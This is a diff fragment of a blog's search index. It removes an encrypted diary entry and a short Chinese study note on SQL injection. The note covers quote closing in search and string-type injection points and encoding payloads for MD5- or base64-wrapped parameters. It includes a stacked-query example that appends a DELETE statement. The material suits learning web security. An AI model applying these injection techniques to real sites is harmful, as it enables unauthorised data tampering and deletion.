c374d034a175af2cdb77f8e3b011660fc6aca74feaf9ffee6e8a04285cbf6ebd1b4b009f642998afe59d9411c9aeb37a68580b450bc4ee8692e6ceae0083232c3144f7a2e1a336532406c1486ffe1d0426a3d14f63d1c4ed28c6e2fcb594c3e59bdcc6677446bf17d033e6effa7bfcc754664d9d958744c13c1a471e8d53290e9863943511919ffe4a70814bfc9a83ae0bba7ce5e911d5218ba068fefe0fc85ff77e297b8262dca32f4e38c6bb2cc0ef4fd0f7d0991924e182560b26270e71c8cc753da822762fb7c0f71679ed00b45cab5d71becf7dbf08d0b58e5c651f20ed134362d2d0a1e4a22edb65c8a7fe139abd52ea2cc15666c94ef1f253387a4aeb7d9397d2c396d15a7bc453c83cdd1ab3b8372c1ae0605d65206c5b9a9f231fc464896458195b260cb079df03b334f6556d272b7f45392d3a0ad9ef14192967779ad6ed710dd78a9954f193661103966af4b7080db72075969052cd84fedf4a6feec7bce755477ba42a9ae5c278d4ac67a6d66a0ab8a890a78013f875ff00444f21e31b6521174cd930fd4b9dcdb6193621dbbae5735b2dab256e526b25339e5c57ba7407008d178770d5fce72edc2893ccd4b857a3029042214e724b965eb1800f07ad114d6984dc52e334346ad74bf2e551435de6f9d3660ace7235b15115e3d2838ae0982261210cec0eccb95f19b1e6c03cf699325ad8f8d73f211bb306a64f1c420f2549fc32f472ceb656065a38c2524470a4a28c3e0d46e26bbacc285799bc6736eb8d7d82767396061daccd7636da72fc352c17977268994489be3d28bbab52e82af94ddc6e1f11cdf649cca72ba213c1dc23be22105589016b58c512e1c694a36574db6dd898c66c9c533349d6829380a6c479ec7a73c58719003077b56bff2bb2746398bca4a6914bf6db9215205744914e92c61e5bd19166bb5b048264a5fe8fc0c1fff15bd81a8a86914e4ab923a591d02806c05f8171247d0592c457f423be7c5a1459da01e7a9c073669602acfcc1f87bbab8f8c4745596b56afd97ccdbdaee66337d0223b6499a024e2f729d032e8113076bcece35bb35982cad67a894afbec9b9d2905fe928b6c39f2e8a4a994d5b37bb095fc7ec94650581b47b503dacffafd1090b421e134fc928aa1eed59df8dcc3345464d0cb6eb632ef7671be494f0f5b042cc8c50e38663c55013f9b501575fa918c7af4b7fbf7bbb37171d279a2742ce7278a232abe46d111622516614a27176e588a145d17c1eaff72b20779e7d9fe13bc9fd55b9d82128d4377a0aadb2378961f39980f9f755ed0662aeeb30585eb0d5c6ec83b7f1d2bd1e63113cba40e62012ef3629fbb0b53ebf2d7060cef8ce6655d009a6a98599271f5c89739a9a99cbf9df2db899ae38f20f2ac1af7164a5360cf559a8bdc24c6ddec2eea970718a107e59e1e39c9bb323c09ce686cef7542a42d445ca0587d84e11b48104e3593c300da3c1a5f0d30f95735d7ecfa1b980027b8f7ed57a5b1f861f0cf9d69971c1c6486f5ac7762c94bc3cfa556c8c195a084b7ab5a0c8d71194a557b85401dc589377d4844a452dd5dfbfb0f257306c5f7b37ad3b12a7f78cef24f760e45ebe80b360422e4c4aac9b4e1807695f7ca385e5efbb8cf2038ccc602d8ec391c10b9217114b36aa95b39d0122ae0601581603a4d8fd653dc3f67951c7420b8e3d2d8e027a66c927e86672ad3e7670feb091aa22043c49e282fc4e79a33a9134a23569fec3e68ca4fd2f8eb67867ed76819c05fedeaf00a12b99ab607c14d5a008ab43a7237de0ab0e87b4df1d788f52d0687e3744b24fe5d125442ea251734ee595f7935175d2e7856ddbdfb0bcf74045d55e018b249dc6fa321c9505b831e27fd82632da51508fbd8064e75402a85e98c66a910ac7042bf47839401b16c83708bb83cf581880289d5fd0d2414b0f3b10607da3c30020a0b714c48de17f4a1413b264e0fc6df8c66378631fe78a133258f0472e604ac7398bf8ddd8f75d26b5552e926793fbcf8d788595c43906d2b196f4fdee1f8d2d5fae0896cf8325e95b8bb5371fab1fed7fafb28f697b3e73e7b7f477d07ea0c9245a1987b133391b0c15c36c05c774ff107755bf91d78fe6343e0b725e123cea772f2d3d18aa39a4761f4e212c9d71ac448dc30bd75aa470ec28ac6e601b027b39aadbd5d2fb6f2dcb938d540992a9c2a184cf74a3d301153d8f35bf7c5fb1e950b344b1632daaaadcfec31c18ebb428e870ab616fe73523c7b4667d8fbe58ea3f8803a610792ecc066c1b119a8906217a9d566481aa38962e2cc11a3b66987c95770db049651f188a8971fd4e0024cfc649f75356fc184b024e404cabdcdc81d845c00f00689c6080dfb4097554d29fa7d4139e802df374b1fdd8830a64d800f8ee53d98f1c4c89a94598d8b33f134b2812d23f5e1d41d7b8bc7010727a2f6f793934c20c99b26125385a06b105854ad646be1843daf6305f8063aa5dadd11f1f36750b91bc528a6243a90d5e58537c56f43bf26611feb4e4ae46e078afbd9c92146086fef2e182f5e2f93922ec3e5047037b3167f1cb4a1091a9de144f8fcfdfbda1f1635da60d3ebf9b1724b29a6adf048105de9e87c80b69a63b879707e89e5edad79f5a1a8d4af98bd49e9c7421c115d430c86d6ae73632ac8ed779d9b494326e09441bed9b5f2153247994b721f0fbbc83fc87fe9a25baba224b568cae35d68714f917eba2b5c518b33044d412d3e966226993b16e6591431be489124f3a50b6d27c26eb8dfa22564adb231faad47fd71ff71ac16278df47a49b9f3e09a94511059dc2bd6d2ed2fd1c7fac2ef579282b38451b0b83b41f16053fb9f09b7c96b67003217a13272f1c8b9d4533d3ff530c29aaf2d797f348e018abc1860f374b41dad3c909daa2c41e1447c0fd1be7c01619cc6cd6fcf4580791cc191aec09f89ca974bafb64745c871d001cb55aeb24618ffa58374ee30d73f87373545e7c7ccd1b1f0971d15cd8390b4c46a38ad9050436111d2bf9894d81e598d5e002c0afbc66121941e28d8e7ae1ad576d61a7eb873a1972d00c453d91c5530f9bf77433672bb6e53b43da3cc6926e455ff34a7274d8501071c797d6820417ec31174a7cb249d0bbc51423b1c227192743d75c32a2a63408142563d8f43848dab7f88a0867f661d764bace343a6db3308e02ceea9d083ea04b9b2d324df8ac88d88f58b6904fc29ebddb0d997d0a1585a948810551bdce2d26143f46bf16c55f62c9161be4bd2d22642cd28028f96dc8a4d73b3facfa31aaca33f12bacc0b8339928d73cd4a7a31a9e078ddc48fa304ecb4e0e1f6fce02a299cd8748fa9d930fe829b362d52ba74ab6129db558e7b9995592f7ade609f8baed2c0a014509783d2a088c61618e64e991d3ec1561e9e57906c72f2f45b13a4ea382f02a730f5ec1fbf94264a497d268786c5ad2c6e909986b2bb858444cf386c2665a0f2829875aba4f97753b959bae04877e478201b4745f9cf315e277b73cbbfe839415f1d0b9bedf93cafc54922b4678564f78fdea2ba99aa1baec5baa872909221386fdf99d7d89ae08ef0c267717c74e7e2853c53375afdb8d65d041b5e7c3c060ee02ba00c13505b183fea50d9e41d301b1e486396de015fb8a214da75a27dc3fe427a8f5ebcdd1d2c75d283f91bfdc77590cdfb889de2599d1b98c6d8bf7b211ae8f5d46d5976949f6e7a15c907b0a4af7e376fe8975c08aa1c1fc5e6007b41d8b1d1d250d4ac858fa43ab56e35fb560dac33f8ef889fc3da8153f67e67eb9d968754814c80088540a5f39f9694d0acea4ceb6830e8d2ed4fe</script>
-  <div class="hbe hbe-content">
-    <div class="hbe hbe-input hbe-input-default">
-      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
-      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
-        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
-      </label>
-    </div>
-  </div>
-</div>
-<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
-      <categories>
-        <category>others</category>
-      </categories>
-      <tags>
-        <tag>Diary</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>关于搜索型、字符型注入以及参数加密</title>
-    <url>/2021/06/11/%E5%85%B3%E4%BA%8E%E6%90%9C%E7%B4%A2%E5%9E%8B%E3%80%81%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5%E4%BB%A5%E5%8F%8A%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86/</url>
-    <content><![CDATA[<h1 id="搜索型、字符型注入"><a href="#搜索型、字符型注入" class="headerlink" title="搜索型、字符型注入"></a>搜索型、字符型注入</h1><span id="more"></span>
-
-<p>一般搜索栏都会进行模糊搜索</p>
-<p>$search=GET[‘x’]</p>
-<p>可能会用到Select * from table where name like ‘%$search%’</p>
-<p>所以搜索型字符一般都有引号，需要考虑引号闭合</p>
-<p>字符型注入一样也会有引号，有些数字型也会有引号</p>
-<h1 id="参数加密"><a href="#参数加密" class="headerlink" title="参数加密"></a>参数加密</h1><p>一些注入点会用md5、base64等方式进行加密，所以我们也需要加密后再进行注入</p>
-<h1 id="SQL删除更新查询"><a href="#SQL删除更新查询" class="headerlink" title="SQL删除更新查询"></a>SQL删除更新查询</h1><p>注入时根据语句来构造语句</p>
-<p>查询：<code>select * from zhibo_test.m_sms where id=1;</code></p>
-<p>插入:<code>insert into zhibo_test.m_sms values(&#39;66&#39;,&#39;register&#39;,&#39;13345677654&#39;,&#39;1234&#39;,&#39;0&#39;,&#39;11.11.1.1&#39;,&#39;15345333321&#39;);</code></p>
-<p>更新:<code>update zhibo_test.m_sms set username=&#39;xiaodi&#39; where id=27;</code></p>
-<p>删除: <code>delete from m_sms where id=28;</code></p>
-<p>多条叠加（堆叠测试）:<code>select * from m_sms; delete from m_sms where id=66;</code></p>
-]]></content>
-      <categories>
-        <category>Web Security</category>
-        <category>Sql注入</category>
-      </categories>
-      <tags>
-        <tag>Web Security</tag>
-        <tag>SQL Injection</tag>
       </tags>
   </entry>
   <entry>
